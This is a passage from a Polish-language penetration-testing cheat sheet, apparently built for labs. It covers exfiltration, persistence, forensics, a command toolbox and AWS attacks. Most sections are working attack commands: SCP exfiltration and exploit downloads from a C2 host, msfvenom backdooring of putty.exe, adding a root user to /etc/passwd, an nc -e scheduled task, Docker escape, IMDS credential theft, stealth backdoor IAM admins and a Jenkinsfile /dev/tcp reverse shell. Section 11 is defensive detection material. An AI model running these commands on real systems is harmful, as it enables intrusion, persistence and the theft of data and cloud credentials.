base64 -w0 tajny_plik.zip                             # alternatywa
# U atakującego:
xxd -r -p data.hex > odzyskany_plik.zip
# base64 -d data.b64 > odzyskany_plik.zip
```
Windows base64:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.kdbx"))   # skopiuj output
# u atakującego: echo '<b64>' | base64 -d > loot.kdbx
certutil -encode plik plik.b64   /   certutil -decode plik.b64 plik   # LOLBin b64
```

## 9.5 Klasyczna eksfiltracja (z modułów)
```bash
tar czf dump.tar.gz /root /etc/                       # archiwizacja
scp dump.tar.gz attacker@c2-server.thm:~              # exfil przez SCP
```

---

# 10. Persistence & Backdooring

### Backdoor w binarce (msfvenom -x — wstrzyknięcie do legalnego .exe)
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp \
  lhost=$LHOST lport=4444 -b "\x00" -f exe -o puttyX.exe
# -x szablon | -k zachowaj oryginalną funkcję | -b znaki zabronione
```
### Linux — dodanie superusera (patrz §4.1 /etc/passwd)
```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
### Windows — scheduled task / usługa jako persistence (patrz §4.2)
```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\nc.exe -e cmd.exe ATTACKER 4444" /sc onlogon /ru SYSTEM
```

---

# 11. Blue Team / Forensics

> Sekcja obronna/analityczna — detekcja i triage podejrzanych artefaktów.

## 11.1 Wzorce detekcji (co robi atakujący — do korelacji w logach)
```bash
# Faza 1: Discovery spike
whoami; id; pwd; ls -la; crontab -l                   # rozpoznanie
ps aux | egrep "edr|splunk|elastic"                   # szukanie narzędzi security
uname -r                                              # wersja kernela (np. stary 4.4)
# Faza 2: Download do /tmp + kompilacja exploita
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit; chmod +x /tmp/pwnkit; /tmp/pwnkit
# Faza 3: Exfil przez SCP
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm:~
```

## 11.2 Linux — ausearch (audyt)
```bash
ausearch -i -x socat                                  # podejrzane komendy po nazwie
ausearch -i --pid 27806                               # proces rodzic → drzewo procesów
ausearch -i --ppid 27808 | grep proctitle             # procesy potomne
ausearch -i -f /etc/systemd                           # zmiany plików w katalogu
```

## 11.3 Windows — analiza plików
Hash pliku:
```powershell
Get-FileHash -Algorithm SHA256 .\file.exe
certutil -hashfile filename.exe SHA256
```
Strings / grep:
```powershell
Select-String -Path .\file.txt -Pattern "http"
Select-String -Path "C:\Logs\access.log" -Pattern "admin" -CaseSensitive
findstr /i "password" file.txt
Get-Process | Select-String "sql"                     # procesy z 'sql'
```
Metadane i podpis cyfrowy:
```powershell
Get-Item .\suspicious_file.exe | Select-Object *
Get-AuthenticodeSignature .\installer.exe             # czy podpisany/zaufany
```
Hex / magic bytes:
```powershell
Format-Hex .\file.exe | select -first 5
```
DLL — co ładuje proces:
```cmd
tasklist /m                                           :: wszystkie używane DLL
tasklist /m /fi "IMAGENAME eq notepad.exe"            :: DLL notepada
tasklist /m /fi "modules eq malicious.dll"            :: kto używa danej DLL
```
Certutil dekodowanie/enkodowanie:
```cmd
certutil -decode plik.b64 plik                        :: dekoduj base64
certutil -encode plik plik.b64                        :: enkoduj base64
```
Ukryte bajty wykonywalne w skrypcie:
```bash
xxd suspicious_script.sh | head -n 20
```

## 11.4 Windows — USB / nośniki wymienne (jakie artefakty zostają, jak wykryć)

> Strona OBRONNA/FORENSIC: co system zapisuje przy podpięciu nośnika i przy kopiowaniu danych — do triage'u „czy ktoś wyniósł dane na USB". To są miejsca, które analityk czyta; jednocześnie pokazują, dlaczego „ukrycie śladów" jest w praktyce niepełne (śladów jest wiele i w różnych miejscach).

> 🎯 **Drogowskaz — triage USB:** 1) **czy w ogóle był nośnik** → rejestr `USBSTOR`/`USB` (model, VID/PID, seriale). 2) **kiedy pierwszy/ostatni raz** → `setupapi.dev.log` + Partition/Diagnostic. 3) **jaka litera dysku / kto podłączył** → `MountedDevices` + DriverFrameworks-UserMode (per user SID). 4) **czy KOPIOWANO pliki** → to wymaga *wcześniej* włączonego audytu obiektów (SACL) → Security 4663; bez tego zostają tylko poszlaki (`$MFT`, LNK, Jump Lists, `RecentDocs`).
> 💎 **Co wartościowe:** seryjny numer urządzenia (koreluje z konkretnym pendrivem) · SID użytkownika, który je zamontował · timestampy pierwszego podpięcia · dowód kopiowania (4663) jeśli audyt był włączony.

**Krok 1 — Które urządzenia USB storage były kiedykolwiek podpięte (rejestr, offline lub live):**
```cmd
:: Lista wszystkich nośników masowych USB (model + rewizja są w nazwie klucza)
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /s

:: Wszystkie urządzenia USB (nie tylko storage) — tu siedzą VID_xxxx&PID_xxxx i seriale
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USB" /s
```
To samo w PowerShell, czytelniej (nazwa + numer seryjny):
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\*" |
  Select-Object FriendlyName, PSChildName    # PSChildName = numer seryjny urządzenia
```
> ℹ️ Jeśli **drugi znak** numeru seryjnego to `&`, seriala nadał sam Windows (urządzenie nie ma własnego) — słabszy dowód korelacji z konkretnym egzemplarzem.

**Krok 2 — Kiedy urządzenie pierwszy/ostatni raz podpięto (setupapi + Partition/Diagnostic):**
```powershell
# Pierwsza instalacja sterownika urządzenia = pierwsze podpięcie (szukaj po VID/PID lub serialu)
Select-String -Path C:\Windows\INF\setupapi.dev.log -Pattern "USBSTOR" -Context 0,3

# Log diagnostyczny partycji rejestruje montowania nośników (model dysku, rozmiar)
Get-WinEvent -LogName "Microsoft-Windows-Partition/Diagnostic" |
  Where-Object Id -eq 1006 |
  Select-Object TimeCreated, @{n='Model';e={$_.Properties[10].Value}}
```

**Krok 3 — Kto (który SID) i jaka litera dysku:**
```cmd
:: Mapowanie wolumin -> litera dysku / GUID (koreluj z numerem seryjnego z kroku 1)
reg query "HKLM\SYSTEM\MountedDevices"
```
```powershell
# Podpięcie/odpięcie nośnika per użytkownik (log jest w kontekście SID-a usera)
Get-WinEvent -LogName "Microsoft-Windows-DriverFrameworks-UserMode/Operational" |
  Where-Object Id -in 2003,2100,2102 |
  Select-Object TimeCreated, Id, UserId, Message
```
> ⚠️ Log `DriverFrameworks-UserMode/Operational` bywa **domyślnie wyłączony** — jeśli pusty, sprawdź `wevtutil gl "Microsoft-Windows-DriverFrameworks-UserMode/Operational"` (pole `enabled:`). Włączenie na przyszłość: `wevtutil sl ".../Operational" /e:true`.

**Krok 4 — Czy pliki faktycznie skopiowano na nośnik (wymaga audytu OBIEKTÓW):**
```powershell
# Zadziała TYLKO jeśli wcześniej włączono audyt dostępu do obiektów + SACL na plikach/folderach.
# 4663 = próba dostępu do obiektu; filtruj po ścieżce docelowej = litera pendrive'a.
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} |
  Where-Object { $_.Message -match ' E:\\' } |            # E: = litera nośnika z kroku 3
  Select-Object TimeCreated, @{n='User';e={$_.Properties[1].Value}},
                @{n='Object';e={$_.Properties[6].Value}}
```
Jak włączyć audyt na przyszłość (żeby 4663 w ogóle powstawało):
```cmd
:: 1) polityka: audyt dostępu do plików
auditpol /set /subcategory:"File System" /success:enable /failure:enable
:: 2) SACL na wrażliwym folderze (audytuj zapis/odczyt dla Everyone)
:: (GUI: Właściwości -> Zabezpieczenia -> Zaawansowane -> Inspekcja) lub icacls:
icacls "C:\Dane_wrazliwe" /setintegritylevel High
```
> 💎 **Bez audytu 4663** dowód kopiowania jest pośredni: świeże wpisy w `$MFT`/`$UsnJrnl` na wolumenie nośnika, pliki `.lnk` w `Recent`, `RecentDocs` w rejestrze usera, Jump Lists (`AutomaticDestinations`). To już analiza dysku (Autopsy / KAPE / Eric Zimmerman tools), nie same logi.

## 11.5 Windows — wykrywanie manipulacji przy Event Logach (log tampering)

> Strona OBRONNA: jak analityk POZNAJE, że ktoś czyścił/wyłączał logi. Samo czyszczenie zostawia własny, głośny ślad — to go wykorzystujemy. Do raportu z pentestu: „brak alertu na 1102" opisuje się jako finding (patrz §14).

> 🎯 **Drogowskaz — hunt na tampering:** 1) **jawne wyczyszczenie** → Security **1102** i System **104** (to ZDARZENIA, które powstają właśnie przy czyszczeniu — nie da się ich uniknąć czyszcząc). 2) **zatrzymanie usługi EventLog** → System 7035/7036 + luka czasowa. 3) **dziura w ciągłości** → rosnące `RecordId` z nagłym skokiem / brakiem godzin. 4) **osłabienie audytu** → 4719 (zmiana polityki audytu), 1100 (zamknięcie usługi logowania). 5) **Sysmon** jeśli wdrożony → EID 1 (proces `wevtutil cl`, `Clear-EventLog`, `Remove-EventLog`).
> 💎 **Co wartościowe:** czas 1102 + SID/konto, które czyściło · nazwa hosta · korelacja: „luka w logach dokładnie w oknie ataku" · czy po czyszczeniu zaraz padła usługa EventLog.

**Krok 1 — Kto i kiedy wyczyścił log (te zdarzenia powstają Z czyszczenia):**
```powershell
# Security wyczyszczony: EID 1102 (jest w logu Security, zaraz po czyszczeniu)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} |
  Select-Object TimeCreated,
    @{n='User';e={$_.Properties[1].Value}},
    @{n='Domain';e={$_.Properties[2].Value}}

# System/Application wyczyszczony: EID 104
Get-WinEvent -FilterHashtable @{LogName='System'; Id=104} |
  Select-Object TimeCreated, @{n='User';e={$_.UserId}}, Message
```
```cmd
:: Szybki odpowiednik w cmd (query po ID)
wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text /c:5
```

**Krok 2 — Zatrzymanie/restart usługi Event Log (klasyczny ruch przed czyszczeniem):**
```powershell
# 7035/7036 = zmiany stanu usług; filtruj po "Windows Event Log"
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7035,7036} |
  Where-Object Message -match "Event Log" |
  Select-Object TimeCreated, Id, Message
```

**Krok 3 — Dziura w ciągłości logu (nawet po „cichym" kasowaniu pojedynczych wpisów):**
```powershell
# Rosnący RecordId powinien być gęsty; nagły skok = potencjalnie usunięte wpisy.
# Szukaj też przerw czasowych (godziny bez ŻADNEGO zdarzenia w gadatliwym logu).
Get-WinEvent -LogName Security -MaxEvents 2000 |
  Sort-Object RecordId |
  Select-Object RecordId, TimeCreated |
  Where-Object { $_.RecordId } |
  # ręcznie obejrzyj skoki RecordId oraz luki > kilku minut w godzinach pracy
  Format-Table -AutoSize
```

**Krok 4 — Osłabienie audytu (cichsze niż czyszczenie — zmiana polityki zamiast kasowania):**
```powershell
# 4719 = zmieniono politykę audytu systemu; 1100 = usługa logowania zdarzeń zamknięta
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4719,1100} |
  Select-Object TimeCreated, Id, Message
# Stan bieżący polityki (czy ktoś pościągał kategorie do 'No Auditing'):
auditpol /get /category:*
```

**Krok 5 — Sysmon (jeśli wdrożony): złap SAMO polecenie czyszczące:**
```powershell
# Sysmon EID 1 = utworzenie procesu; łap narzędzia do czyszczenia/kasowania logów
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 1 -and $_.Message -match "wevtutil|Clear-EventLog|Remove-EventLog|Clear-Log" } |
  Select-Object TimeCreated, @{n='Cmd';e={($_.Message -split "`n" | Select-String 'CommandLine').Line}}
```
> 💎 **Wniosek do raportu (§14):** jeśli 1102/104 istnieją, ale NIE ma na nie alertu w SIEM → finding „Insufficient Logging & Monitoring". Rekomendacja: forwarding logów poza host (Windows Event Forwarding / agent SIEM) — atakujący czyści log LOKALNIE, więc kopia zdalna przeżywa; alert na 1102/104/4719; ochrona/rozmiar logu (`wevtutil sl Security /ms:1073741824`).

## 11.6 Windows — wykrywanie prób AV/AMSI bypass i injection (blue-team)

> Strona OBRONNA do koncepcji z §2.16: jak analityk WYKRYWA próby omijania AV/AMSI oraz process-injection. Same czujniki i EID-y — do huntu i do raportu (§14).

> 🎯 **Drogowskaz — hunt na evasion:** 1) **skrypt po deobfuskacji** → PowerShell **Script Block Logging** (EID **4104**) loguje treść *rozpakowaną*, więc łapie to, co AMSI widziało. 2) **wykrycie przez sam AV** → Defender **1116/1117** (malware found/action). 3) **manipulacja AMSI** → Sysmon EID **7** (ładowanie `amsi.dll` przez nietypowy proces) + błędy integralności. 4) **injection** → Sysmon **8** (CreateRemoteThread), **10** (ProcessAccess do lsass/obcych), **25** (process tampering). 5) **podejrzane drzewo procesów** → Sysmon **1** (`winword.exe`→`powershell.exe`).
> 💎 **Co wartościowe:** pełna, odobfuskowana komenda z 4104 · proces-rodzic wstrzykujący · to, że payload odpalił się z procesu Office · wykluczenia Defendera nadużyte jako ścieżka ataku.

**Krok 1 — PowerShell Script Block Logging (najmocniejszy sygnał; loguje treść PO deobfuskacji):**
```powershell
# EID 4104 = wykonany blok skryptu; widzisz to, co AMSI dostało (nawet z -enc/obfuskacji)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object Id -eq 4104 |
  Where-Object Message -match "FromBase64String|IEX|DownloadString|VirtualAlloc|amsi" |
  Select-Object TimeCreated, @{n='Script';e={$_.Message}}
```
Włączenie na przyszłość (GPO lub rejestr):
```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
:: dodatkowo: Module Logging + Transcription dla pełnej telemetrii PS
```

**Krok 2 — Defender sam coś złapał (wykrycie/akcja):**
```powershell
# 1116 = wykryto malware, 1117 = podjęto akcję (quarantine/remove)
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object Id -in 1116,1117 |
  Select-Object TimeCreated, Id, @{n='Threat';e={$_.Properties[7].Value}}
```

**Krok 3 — Sysmon: manipulacja AMSI + injection (jeśli Sysmon wdrożony):**
```powershell
# EID 7 = ImageLoad: amsi.dll ładowany przez proces, który nie powinien go dotykać
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 7 -and $_.Message -match "amsi\.dll" } |
  Select-Object TimeCreated, @{n='Proc';e={($_.Message -split "`n" | Select-String 'Image:').Line}}

# EID 8 = CreateRemoteThread, EID 10 = ProcessAccess (np. do lsass), EID 25 = process tampering
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object Id -in 8,10,25 |
  Select-Object TimeCreated, Id, Message
```

**Krok 4 — Podejrzane drzewo procesów (Office rodzi shell):**
```powershell
# Sysmon EID 1 = ProcessCreate; czerwona flaga: winword/excel/outlook -> powershell/cmd/wscript
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 1 -and $_.Message -match "ParentImage:.*(winword|excel|outlook|mshta)" `
                 -and $_.Message -match "Image:.*(powershell|cmd|wscript|cscript)" } |
  Select-Object TimeCreated, Message
```

**Krok 5 — Nadużyte wykluczenia Defendera (częsty realny finding):**
```powershell
# Ścieżki/procesy wyłączone ze skanu = gdzie atakujący bezpiecznie odkłada payload
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension
```
> 💎 **Wniosek do raportu (§14):** brak Script Block Logging / brak Sysmona / szerokie `ExclusionPath` → finding „Insufficient Endpoint Visibility / AV Misconfiguration". Rekomendacja: włącz 4104 + Module/Transcription, wdroż Sysmon z sensowną konfiguracją (np. bazową SwiftOnSecurity), zawęź wykluczenia Defendera, włącz **ASR rules** (blokada child-process z Office, blokada obfuskowanych skryptów), forwarding do SIEM (spójne z §11.5).

---

# 12. Toolbox — Reference

> Narzędzia bazowe i systemowe, przydatne na każdym etapie.

## 12.1 grep (Extended Regex)
```bash
grep -E "Failed|Accepted" /var/log/auth.log           # alternatywa | — udane/nieudane logowania
grep -E "log+"                                        # \+ jeden lub więcej: log, logg, loggg
grep -E "https?"                                      # ? zero lub jeden: http oraz https
grep -E "[0-9]{1,3}"                                  # {n,m} od 1 do 3 cyfr
grep -Eo "\b[a-z]{3}\.[a-z0-9]+\.[a-z]{3}\b"          # \b granica słowa: 3litery.wielo.3litery
grep -A 5 "cos"                                       # 5 linii PO
grep -B 5 "cos"                                       # 5 linii PRZED
grep -C 5 "cos"                                       # 5 linii wokół
grep -rniE "wzorzec" /sciezka                         # -r rekursywnie -n numery -i ignore case
```

## 12.2 awk
```bash
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt   # separator [ oraz ], drukuj 2. kolumnę
awk '{print $1}' access.log | sort | uniq -c | sort -rn   # top IP z logu
```

## 12.3 find
```bash
sudo find / -name ".env.local" -type f 2>/dev/null    # po nazwie
find . -iname "*monkey*"                              # -iname = bez wielkości liter
find / -writable -type d 2>/dev/null                  # zapisywalne katalogi (privesc)
find / -perm -u=s -type f 2>/dev/null                 # SUID (privesc)
find / -mmin -10 2>/dev/null                          # pliki zmienione w ostatnich 10 min
```

## 12.4 xxd (hex)
```bash
xxd plik.bin                          # podgląd Offset | Hex | ASCII
xxd -l 16 plik.bin                    # -l 16 = pierwsze 16 bajtów (magic bytes / nagłówek)
xxd -p plik.txt                       # czysty hex (do skryptów)
xxd -c 8 plik.bin                     # -c 8 = 8 bajtów na linię
xxd -r zrzut_hex.txt > plik.bin       # -r reverse: hex → binarka
xxd -i plik.bin                       # eksport jako char[] (shellcode do exploita)
```

## 12.5 netstat (flagi)
```
-a  listening + non-listening    -l  tylko listening    -n  numerycznie (bez DNS)
-t  TCP    -u  UDP    -x  UNIX    -p  PID + nazwa procesu
```

## 12.6 Analiza plików / malware
```bash
olevba <plik.doc>                     # wyciąga makra VBA
vol -f memorydump.raw -h              # Volatility: lista modułów zrzutu RAM
strings -n 8 plik.bin | less          # czytelne stringi
file plik.bin                         # rozpoznanie typu po magic bytes
binwalk -e plik.bin                   # ekstrakcja osadzonych plików
```

## 12.7 hash_extender (length extension attack)
> 🔗 https://github.com/iagox86/hash_extender
> Znając hash końcowy pliku, dołączasz dane bez znajomości sekretu (jeśli podpis = `hash(secret + data)`).
```bash
./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html
# --data oryginał | --signature oryginalny hash | --append doklejane dane
# --out-data-format=html format wyjścia | --format md5 zmiana algorytmu (domyślnie SHA256)
```

## 12.8 Docker escape
```bash
ls -la /var/run/docker.sock                           # 1. czy jest socket Dockera
docker                                                # czy mamy klienta (jak nie → ręczne API przez curl)
docker -H unix:///var/run/docker.sock ps              # lista kontenerów hosta
docker -H unix:///var/run/docker.sock images          # dostępne obrazy
# Zamontuj system hosta w kontenerze i wejdź jako root:
docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
# php:8.1-cli = znaleziony obraz | -v /:/mnt/matka montuje root hosta | --rm sprząta ślady
lsblk                                                 # (lub fdisk -l) urządzenia do montowania
capsh --print                                         # capabilities kontenera
```
> Wersje z ręcznym API (bez klienta docker):
> `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`

## 12.9 Skanery podatności / hosting
```bash
sudo systemctl start nessusd.service                  # Nessus → https://127.0.0.1:8834
sudo neo4j start                                       # baza pod BloodHound
```

## 12.10 Git (workflow tej ściągi)
```bash
git status                            # co się zmieniło
git add nazwa_folderu/plik.md         # staging
git commit -m "Opis zmian"            # commit
git push origin main                  # push
git pull origin main                  # pull
```

---

# 13. Cloud — AWS (enumeracja i atak)

> Coraz częściej cel to konto w chmurze, nie serwer. Fundament AWS: **S3** (storage), **IAM** (tożsamości/uprawnienia), **EC2** (VM), **Lambda** (funkcje). Klucz `AKIA...` + secret = tożsamość stała; `ASIA...` + SessionToken = tymczasowa (rola). Zawsze w granicach zakresu.

> 🎯 **Drogowskaz — co po kolei (AWS):**
> 1. **Bez kluczy** — potwierdź, że to AWS: `host -t ns` + `whois` (`awsdns-*` → Route53, reverse-DNS `ec2-*.compute-1.amazonaws.com` → EC2). §13.1.
> 2. **Znajdź buckety** — nazwa w źródle strony (DevTools Network / `curl|grep`); stany: **XML=OPEN** · **AccessDenied=istnieje+chroniony** · **NoSuchBucket=brak**. Brute: `cloud_enum -kf`.
> 3. **Odzyskaj Account ID** (12 cyfr) — z publicznego AMI (`OwnerId`) lub brute `s3:ResourceAccount`; potem sprawdzaj istnienie principali i brute ról w **Pacu** (`iam__enum_roles` → auto-AssumeRole = creds `ASIA...`).
> 4. **Z kluczami** — kim jestem: `sts get-caller-identity` (cicho: `get-access-key-info` / `lambda invoke` błąd / zmiana `--region`).
> 5. **Zakres uprawnień** — inline + grupy + wersje managed; jeden `get-account-authorization-details` i filtruj `--query` offline.
> 6. **Eskaluj** — `iam:CreateAccessKey`/`AddUserToGroup`/`PutUserPolicy`/`AssumeRole`, `*:*`, ABAC-tagi. **Loot**: bucket z `.git` (§13.5), poison CI/CD (§13.6), `terraform.tfstate` (§13.8).
>
> 💎 **Co wartościowe:** klucz `AKIA/ASIA...`+secret w źródle/plikach/IMDS/`env` · **12-cyfrowy Account ID** · bucket OPEN · publiczne AMI/snapshoty z sekretami · **`.git` w buckecie** (cała historia!) · `withAWS` w Jenkinsfile · **`terraform.tfstate`** (plaintext IAM admin) · statementy `iam:*`/`*:*` · `get-account-summary`: MFA=0.

## 13.1 Rozpoznanie bez kluczy (unauthenticated)
Najpierw potwierdź, że cel to w ogóle AWS:
```bash
host -t ns $DOMAIN                                    # nameservery awsdns-* → AWS Route53
whois awsdns-00.com | grep 'Registrant Organization' # Amazon Technologies Inc.
host $IP                                              # reverse-DNS ec2-*.compute-1.amazonaws.com → EC2
whois $IP | grep 'OrgName'                            # OrgName: Amazon...
```
Znajdź i sklasyfikuj buckety S3 (nazwa często wycieka w źródle strony — DevTools → Network):
```bash
curl -s http://$DOMAIN | grep -oP '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com'   # wyłuskaj URL bucketu
curl -i http://<bucket>.s3.amazonaws.com/            # XML z <Key> = OPEN · AccessDenied = jest+chroniony · NoSuchBucket = brak
aws s3 ls s3://<bucket> --no-sign-request            # anonimowy listing (gdy public)
aws s3 cp s3://<bucket>/README.md ./ --no-sign-request
```
Brute nazw bucketów (konwencja `org-cel-<8 losowych>`; ten sam suffix bywa reużyty):
```bash
cloud_enum -kf keyfile.txt --quickscan --disable-azure --disable-gcp   # -k KEYWORD lub -kf plik; etykiety OPEN vs Protected
```
> **Region siedzi w URL bucketu** (`...s3.us-east-1...`) — użyj go w `aws configure`. `AccessDenied` na anon ≠ bucket zamknięty (spróbuj z uwierzytelnieniem — patrz §13.5). Domeny do brute: `s3.amazonaws.com`, `awsapps.com` (AWS), `*.core.windows.net`/`azurewebsites.net` (Azure), `storage.googleapis.com`/`appspot.com` (GCP).

> SSRF na instancji EC2 → kradzież tymczasowych creds roli z IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rola>` (IMDSv2: najpierw `PUT .../api/token` z nagłówkiem, potem `GET` z `X-aws-ec2-metadata-token`).

## 13.1b Bez kluczy, ale cross-account (Account ID → principale → role)
```bash
# Odzyskaj 12-cyfrowy Account ID:
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Cel*"  # OwnerId = Account ID
# Sprawdź, czy dany user/rola ISTNIEJE w cudzym koncie (cała interakcja w TWOIM koncie):
aws --profile attacker s3api put-bucket-policy --bucket <mój-dummy> --policy file://grant.json
#   przechodzi (brak outputu) = principal ISTNIEJE; 'Invalid principal in policy' = NIE istnieje (mylący komunikat!)
# Brute nazw ról + auto-AssumeRole w Pacu → tymczasowe creds ASIA...:
pacu
Pacu> import_keys attacker
Pacu> run iam__enum_roles --word-list role-names.txt --account-id <AccountID>
Pacu> run iam__enum_users --word-list user-names.txt --account-id <AccountID>
```
> Principal ARN: `arn:aws:iam::<AccountID>:user/<nazwa>` (lub `role/`, `group/`). `iam__enum_roles` przy trafieniu **sam próbuje AssumeRole** → zwraca `ASIA...`+SessionToken (Initial Compromise). Używaj kluczy *attacker* — moduł spamuje **Twój** CloudTrail, cel nic nie widzi. Wordlisty buduj z prefiksów projektów doklejanych do nazw ról.

## 13.2 Konfiguracja CLI z pozyskanymi kluczami
```bash
aws configure --profile target                       # wklej AKIA..., secret, region (np. us-east-1)
aws --profile target sts get-caller-identity         # kim jestem (ARN, account id) — UWAGA: leci do CloudTrail
aws --profile target sts get-access-key-info --access-key-id AKIA...   # do jakiego konta należy klucz (cicho, offline-ish)
```
Warianty **stealth** (gdy nie chcesz zapalać `get-caller-identity` w logach celu):
```bash
aws --profile target sts get-access-key-info --access-key-id AKIA...   # ujawnia Account ID bez logu u celu
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:<acct>:function:nonexistent out.json  # błąd zdradza tożsamość
aws --profile target sts get-caller-identity --region us-east-2        # zmiana regionu bywa mniej monitorowana
```
Dla creds tymczasowych z roli (`ASIA...`) dopisz `aws_session_token` do profilu:
```bash
aws configure set aws_session_token "<token>" --profile target
```
## 13.3 Enumeracja uprawnień (IAM) — dokąd mogę pójść
```bash
aws --profile target iam list-users
aws --profile target iam list-groups
aws --profile target iam list-roles
aws --profile target iam list-attached-user-policies --user-name bob
aws --profile target iam list-user-policies --user-name bob            # polityki INLINE (łatwo przeoczyć)
aws --profile target iam list-groups-for-user --user-name bob          # grupy → potem list-group-policies
aws --profile target iam get-account-authorization-details    # PEŁNY zrzut IAM (users+groups+policies+roles) — jeden strzał
aws --profile target iam get-account-summary | grep MFA               # MFADevices=0 = konto bez MFA
aws --profile target iam get-policy-version --policy-arn <ARN> --version-id v1
```
> Uprawnienia siedzą w 3 miejscach: **inline** (`list-user-policies`), **managed** (`list-attached-user-policies` + `get-policy-version`), **przez grupy** (`list-groups-for-user`). Zrób jeden `get-account-authorization-details` i filtruj offline: `--query 'UserDetailList[?UserName==\`bob\`]'` / `--filter LocalManagedPolicy`. Szukaj eskalacji: `iam:CreateAccessKey`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `iam:AddUserToGroup`, `sts:AssumeRole`, `*:*`, tagi **ABAC** (`Project=...` sterujące dostępem).

## 13.4 Ruch dalej / eskalacja (przykłady)
```bash
# S3 — pobierz dane z prywatnych bucketów, do których masz dostęp:
aws --profile target s3 ls firma-assets-private
aws --profile target s3 sync s3://firma-assets-private ./loot
# EC2 — cudze AMI / snapshoty (mogą zawierać sekrety):
aws --profile target ec2 describe-images  --owners <acct> --executable-users all
aws --profile target ec2 describe-snapshots --filters "Name=description,Values=*prod*"
# Lambda — wylistuj i wywołaj funkcję:
aws --profile target lambda invoke --function-name <arn> out.json
# IAM privesc (gdy masz PutUserPolicy): dołóż sobie politykę admina:
aws --profile target iam put-user-policy --user-name bob --policy-name pe --policy-document file://admin.json
# Persistencja: nowy klucz dostępu do przejętego usera:
aws --profile target iam create-access-key --user-name bob
```
> Automatyzacja audytu/ataku IAM: **Pacu**, **ScoutSuite**, **enumerate-iam**.

**Backdoor-admin (trwały stealth-admin, T1136.003):**
```bash
aws --profile compromised iam create-user --user-name terraform-svc      # stealth nazwa, nie "backdoor"
aws --profile compromised iam attach-user-policy --user-name terraform-svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile compromised iam create-access-key --user-name terraform-svc # SecretAccessKey zwracany RAZ — zapisz od razu!
aws configure --profile backdoor
```
> Tworzenie userów leci do CloudTrail — używaj wiarygodnej nazwy. `AdministratorAccess` ARN = `arn:aws:iam::aws:policy/AdministratorAccess`.

## 13.5 S3 misconfig `AuthenticatedUsers` + repo `.git` w buckecie
> Bucket blokuje anon (`AccessDenied`), ale ACL `AuthenticatedUsers` = **każdy zalogowany user AWS** (nawet z obcego konta) może czytać. Dowolne ważne `AKIA` działają.
```bash
curl -i https://<bucket>.s3.<region>.amazonaws.com   # AccessDenied XML = anon zablokowany, ale...
aws configure                                         # wklej JAKIEKOLWIEK ważne IAM creds
aws s3 ls s3://<bucket>                               # region MUSI pasować do URL bucketu
aws s3 sync s3://<bucket> ./loot                      # ściąga CAŁOŚĆ, łącznie z ukrytym .git/
```
Jeśli w buckecie jest `.git/` (dirb znajdzie `.git/HEAD` = 200) — masz całe repo z **historią** (usunięte sekrety wciąż ważne!):
```bash
head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
dirb https://<bucket>.s3.<region>.amazonaws.com ./first50.txt     # szuka .git/HEAD
aws s3 sync s3://<bucket> ./repo                      # NIE brute'uj obiektów git — ściągnij .git i pracuj lokalnie
cd repo && git log --oneline --all
git show <commit>                                     # zwłaszcza commity "Fix issue" gdzie usunięto sekret
echo 'YWRtaW46cGFzcw==' | base64 -d                   # nagłówek Authorization: Basic <b64> = user:pass
gitleaks detect                                       # POMOCNICZO — "no leaks" NIE kończy tematu, rób ręczny git log/show
```

## 13.6 Poison the pipeline (CI/CD → RCE → kradzież AWS creds)
> Masz creds do Gitea/GitLab z sekretów? Edytuj **Jenkinsfile** w repo z webhookiem Git Push → build się odpala → shell na builderze jako `jenkins`.
```groovy
pipeline { agent any stages { stage('x') { steps {
  withAWS(region:'us-east-1', credentials:'aws_key') { script {
    if (isUnix()) { sh 'bash -c "bash -i >& /dev/tcp/<mójIP>/4242 0>&1" & ' }   // trailing & KONIECZNE (inaczej step timeoutuje)
  } } } } } }
```
```bash
# Kali z PUBLICZNYM IP (chmurowy) — lokalny nie zadziała:
sudo systemctl start apache2 && tail -f /var/log/apache2/access.log   # test: sh 'curl http://<mójIP>/x' → sprawdź hit
nc -nvlp 4242                                         # złap reverse shell
```
